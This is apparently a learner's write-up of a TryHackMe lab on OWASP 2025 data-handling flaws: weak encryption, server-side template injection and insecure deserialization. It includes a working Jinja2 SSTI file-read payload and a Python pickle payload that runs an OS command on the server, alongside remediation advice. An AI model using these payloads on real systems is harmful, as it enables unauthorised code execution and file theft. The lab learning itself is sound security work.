# Room 3 — OWASP Top 10 2025: Insecure Data Handling

🔗 **Room Link:** [https://tryhackme.com/room/owasptopten2025three](https://tryhackme.com/room/owasptopten2025three)  
📊 **Difficulty:** Beginner  
🏷️ **Tags:** Cryptography, Injection, SSTI, Deserialization

---

## 📖 Room Introduction

This room focuses on how applications **mishandle data** — either by failing to protect it cryptographically, by processing untrusted input insecurely, or by deserializing data without verification. These vulnerabilities are among the most exploited in real-world attacks.

The room covers **3 OWASP 2025 categories**:

| OWASP ID | Category | Description |
|----------|----------|-------------|
| **A04** | Cryptographic Failures | Sensitive data exposed due to weak/missing encryption |
| **A05** | Injection | Unsanitized input executed as commands or queries |
| **A08** | Software or Data Integrity Failures | Insecure deserialization allowing arbitrary code execution |

---

## 🎯 What is the Goal?

By the end of this room, you should understand:

1. What cryptographic failures look like and how to spot weak algorithms
2. How injection attacks (SQL, SSTI, command injection) work in practice
3. How insecure deserialization can lead to Remote Code Execution (RCE)
4. How to think like an attacker when reviewing how applications handle data

---

## 🛠️ What I Did & How I Solved It

### Task 1 — Introduction
Read through the room's setup. Deployed the virtual machine and obtained the target IP address. Understood the scope: three categories all tied to how the application processes, stores, and handles data.

---

### Task 2 — A04: Cryptographic Failures

**Concept:**  
Cryptographic failures occur when sensitive data is:
- Stored in plaintext or with no hashing
- Protected with **weak/deprecated algorithms** like MD5 or SHA-1
- Transmitted over unencrypted channels (HTTP instead of HTTPS)
- Using hardcoded or poorly managed keys

**What I Did:**
- Accessed the application's notes feature
- The notes appeared to be encrypted — I could see encoded strings
- Identified the encryption scheme being used as a **weak/deprecated algorithm**
- Used an online decryption tool (or CyberChef) to reverse the encryption
- Decrypted all stored notes and found a **flag** hidden in one of them

**Steps Taken:**
```
1. Navigate to the notes section of the web app
2. Identify the encoding/encryption pattern on the stored notes
3. Open CyberChef (https://gchq.github.io/CyberChef/)
4. Select the appropriate decryption operation
5. Paste the encrypted note → retrieve plaintext → find the flag
```

**Key Observation:**  
If sensitive data (passwords, notes, personal info) is encrypted with a broken algorithm, an attacker who gains database access can trivially decrypt everything. "Encrypted" doesn't mean "secure" if the algorithm is outdated.

---

### Task 3 — A05: Injection

**Concept:**  
Injection occurs when **user-supplied input is passed directly into a system that executes it** — a database, shell, or templating engine — without proper sanitization.

This room covered **Server-Side Template Injection (SSTI)**, a type of injection where malicious input is processed by a server-side templating engine (like Jinja2 in Python/Flask apps).

**How SSTI Works:**
```
Normal input:   Hello, John
Template result: Hello, John

Malicious input: {{ 7 * 7 }}
Template result: Hello, 49  ← Server evaluated the expression!
```

If the template engine evaluates arithmetic, it can also evaluate **code execution** payloads.

**What I Did:**

1. Found a user-facing input field that reflected back the input in the page response
2. Tested for SSTI with a simple probe: `{{7*7}}`
3. The page returned `49` instead of `{{7*7}}` — confirmed SSTI vulnerability
4. Escalated the payload to read a file from the server:

```python
# Jinja2 SSTI payload to read flag.txt
{{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['__builtins__']['open']('flag.txt').read() }}
```

5. Retrieved the contents of `flag.txt` from the server's filesystem

**Key Observation:**  
SSTI can escalate from harmless arithmetic evaluation all the way to **Remote Code Execution (RCE)**. It's particularly dangerous in Python/Flask apps using Jinja2. The root cause: never rendering user input through a template engine.

---

### Task 4 — A08: Software or Data Integrity Failures

**Concept:**  
This category covers situations where an application processes data without verifying its **integrity** — most critically, **insecure deserialization**.

Serialization converts an object to a storable/transferable format (like JSON or a binary blob). Deserialization reconstructs it. When an application deserializes **user-supplied data** without verification, an attacker can craft malicious serialized objects that **execute arbitrary code** when deserialized.

In Python, the `pickle` module is a common example — pickled objects can contain embedded Python code.

**What I Did:**

1. Identified that the application was accepting a **serialized (pickled) object** from the user
2. Created a malicious pickle payload to execute a command on the server:

```python
import pickle, os, base64

class MaliciousPayload(object):
    def __reduce__(self):
        cmd = ('cat /flag.txt')
        return os.system, (cmd,)

payload = pickle.dumps(MaliciousPayload())
encoded = base64.b64encode(payload)
print(encoded)
```

3. Submitted the base64-encoded payload to the vulnerable input field
4. The server deserialized it and executed the embedded OS command
5. Retrieved the flag from `/flag.txt`

**Key Observation:**  
Insecure deserialization is **very dangerous** because it can lead directly to RCE. The fix: never deserialize data from untrusted sources. Use safe formats like JSON with strict schema validation instead of binary serialization.

---

## 💡 What I Learned

### Technical Takeaways

| Vulnerability | What I Learned |
|---------------|---------------|
| **Cryptographic Failures (A04)** | Use modern, strong algorithms (AES-256, bcrypt/Argon2 for passwords). Never use MD5/SHA-1 for security purposes. Always encrypt sensitive data at rest AND in transit. |
| **Injection / SSTI (A05)** | Never insert user input into template strings. Use template sandboxing or avoid rendering user input through engines entirely. Validate and sanitize all inputs. |
| **Insecure Deserialization (A08)** | Avoid deserializing user-supplied binary data. Prefer JSON with schema validation. If you must use binary serialization, use digital signatures to verify integrity before deserializing. |

### Conceptual Takeaways

- **"It's encrypted" is not enough.** The algorithm matters. MD5 and SHA-1 were broken decades ago. Use bcrypt, Argon2, or SHA-256+ for hashing; AES-256 for symmetric encryption.
- **SSTI is underrated.** Most developers think of SQL injection first, but SSTI in Python Flask/Jinja2 apps is just as impactful and often less well-known.
- **Deserialization = implicit code execution.** Any format that can embed logic (pickle, Java serialization, PHP unserialize) is dangerous with untrusted input. Treat deserialization as code execution.
- **Injection is about trust boundaries.** The fundamental rule: **data is data; code is code.** Never let data cross into code without explicit handling.
- **CyberChef is your friend** for analyzing encoding, encryption, and hashing — a vital tool in any CTF or security analysis workflow.

### New Skills Practiced
- Using **CyberChef** to decrypt/decode cryptographic artifacts
- Identifying and exploiting **SSTI** in Flask/Jinja2
- Crafting **Python pickle payloads** for insecure deserialization exploitation
- Chaining vulnerability analysis: identify → confirm → escalate → capture flag

---
